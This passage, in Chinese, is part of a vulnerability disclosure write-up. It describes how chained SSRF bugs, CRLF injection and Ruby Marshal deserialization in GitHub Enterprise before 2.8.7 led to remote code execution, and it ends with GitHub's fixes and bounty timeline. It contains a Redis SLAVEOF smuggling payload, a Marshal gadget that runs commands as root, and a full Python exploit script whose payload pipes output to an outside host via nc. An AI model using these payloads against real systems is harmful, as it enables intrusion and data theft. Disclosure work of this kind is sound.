    Foo: HTTP/1.1
    Host: 127.0.0.1:12345 
    Accept-Encoding: identity 
看似一小步，对于整个攻击链而言却是一个巨大的飞跃。至少可以在这个 SSRF 执行链中伪造其他协议了，例如:
如果打算采用 Redis，可以尝试使用以下负载：
    http://0:8000/composer/send_email?
    to=orange@nogg& 
    url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A 
注：SLAVEOF 是一个非常好用的命令，可以用来生成出站流量，在处理 Blind-SSRF 时相当有效。
看上去很美，但在协议伪造方面仍存在一些限制，例如：
  1. 不适用于 SSH、MySQL、SSL 等握手协议； 
  2. `Python2` 的局限性导致第二个 SSRF 中的负载仅允许使用介于 0x00 与 0x8F 之间的字节。
顺便提一下，HTTP 方案存在多种协议伪造方法。我的演讲 PPT 也介绍了如何利用 Linux Glibc 功能在 SSL SNI
中进行协议伪造，此外还提供了 Python CVE-2016-5699 漏洞绕过案例分析！
有兴趣的朋友不妨参考一下 :)
##### Bug No.4 危险的反序列化漏洞
现在，我们已经掌握了如何在 HTTP 协议中伪造其他协议，但问题随之而来，该伪造哪些协议呢？
经过一番周折后，终于发现在成功控制 Redis 或 Memcached 的前提下可以触发的漏洞类型。
查看代码的同时不禁产生了 GitHub 为何能够存储 Ruby 对象的疑问。进一步研究后发现 GitHub 企业版使用 Ruby Gem
`memcached` 处理缓存并用 Marsal 包装。
这对我来说可是个天大的好消息。Marsal 的杀伤力众所周知。
（不了解这一点的朋友可以阅读[@frohoff](https://twitter.com/frohoff)与[@gebl](https://twitter.com/gebl)在AppSec
California 2015会议上发表的议题[“Pickle 初体验：对象反序列化梦魇” / Marshalling Pickles: how
deserializing objects can ruin your day](https://frohoff.github.io/appseccali-marshalling-pickles/)）
至此，目标已经十分清晰了。
我们用 SSRF 执行链在 Memcached 中存储恶意 Ruby 对象。待到 GitHub 再次获取缓存时，Ruby Gem `mecached`
将自动对数据进行反序列化操作。结果可想而知……BOOM！远程代码成功执行！XD
Rails 控制台中的不安全 Marsal
    irb(main):001:0> GitHub.cache.class.superclass 
    => Memcached::Rails 
    irb(main):002:0> GitHub.cache.set("nogg", "hihihi") 
    => true 
    irb(main):003:0> GitHub.cache.get("nogg") 
    => "hihihi" 
    irb(main):004:0> GitHub.cache.get("nogg", :raw=>true) 
    => "\x04\bI\"\vhihihi\x06:\x06ET" 
    irb(main):005:0> code = "`id`" 
    => "`id`" 
    irb(main):006:0> payload = "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"
    => "\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\a:\t@srcI\"\t`id`\u00 06:\u0006ET:\f@linenoi\u0000:\f@method:\vresult" 
    irb(main):007:0> GitHub.cache.set("nogg", payload, 60, :raw=>true) 
    => true 
    irb(main):008:0> GitHub.cache.get("nogg")
    => "uid=0(root) gid=0(root) groups=0(root)\n" 
现在，我们不妨对上述内容做个总结！
  1. 第一个SSRF：绕过 `Webhook` 现有保护 
  2. 第二个SSRF：`Graphite` 服务 SSRF 
  3. 将前两个 SSRF 整合到 SSRF 执行链 
  4. SSRF 执行链CR-LF注入 
  5. 伪造 Memcached 协议并插入恶意 Marsal 对象 
  6. 触发 RCE 
SSRF 攻击链构造
完整代码可参见
[Gist](https://gist.github.com/orangetw/bbd592f5a32c59bbefefb3195c2df383) 与
[Youtube](https://www.youtube.com/watch?v=GoO7_lCOfic&feature=youtu.be) 视频
    #!/usr/bin/python
    from urllib import quote
    ''' set up the marshal payload from IRB
    code = "`id | nc orange.tw 12345`"
    p "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"
    '''
    marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`id | nc orange.tw 12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'
    payload = [
        '',
        'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),
        marshal_code,
        '',
        ''
    ]
    payload = map(quote, payload)
    url = 'http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:11211/'
    print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by PI:EMAIL"
    print '-'*10 + '\n'
    print url + '%0D%0A'.join(payload)
    print '''
    Inserting WebHooks from:
    https://ghe-server/:user/:repo/settings/hooks
    Triggering RCE from:
    https://ghe-server/search?q=ggggg&type=Repositories
    '''
#### 修复方案
为防止类似问题再次发生，GitHub 已完成多处改进！
  1. 提升 Gem `faraday-restrict-ip-address` 性能 
  2. 用定制 Django 中间件确保攻击者无法从外部抵达路径 `http://127.0.0.1:8000/render/`
  3. 增强使用 `User-Agent: GitHub-Hookshot` 模式阻止访问路径的 `iptables` 规则
    $ cat /etc/ufw/before.rules
    ...
    -A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp- flags PSH,ACK PSH,ACK --remove -m string --algo bm --string "User-Agent: GitHub-Hookshot" -j REJECT --reject-with tcp- reset
    ... 
#### 时间线
  * 2017/01/23 23:22 通过HackerOne将漏洞报告给GitHub，报告编号[200542](https://hackerone.com/users/sign_in)
  * 2017/01/23 23:37 GitHub将状态改为“已分类处理”（Triaged）
  * 2017/01/24 04:43 GitHub回应“该问题已得到验证、正在制定修复方案”
  * 2017/01/31 14:01 GitHub企业版2.8.7发布
  * 2017/02/01 01:02 GitHub回应“该问题已得到解决”！
  * 2017/02/01 01:02 GitHub颁发7,500美元漏洞赏金！
  * 2017/03/15 02:38 GitHub颁发5,000美元最佳报告奖金
* * *